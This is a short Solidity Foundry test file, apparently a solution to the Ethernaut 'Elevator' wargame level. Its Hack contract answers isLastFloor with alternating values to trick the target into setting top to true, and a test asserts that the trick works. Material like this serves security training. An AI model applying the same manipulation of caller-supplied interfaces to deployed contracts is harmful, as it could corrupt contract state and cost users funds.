// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test , console} from "forge-std/Test.sol";

import {Elevator} from "../src/Elevator.sol";

contract ElevatorTest is Test {

    Elevator elev;
    Hack hack;

    address player = makeAddr("PL");
    function setUp() public {

        elev = new Elevator();
        hack = new Hack(elev);


    }

    function testSetToptoTrue() public {

        vm.prank(address(hack));
        hack.attack();

        console.log(elev.top());

        assert(elev.top() == true);

    }
    
}

contract Hack {


    bool public top;
    Elevator public elevator;

    constructor(Elevator _elevator) {
        top = false;
        elevator = _elevator;
    }

    function attack() public {
        elevator.goTo(8);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool ret = top;
        top = !top;
        return ret;
    }
}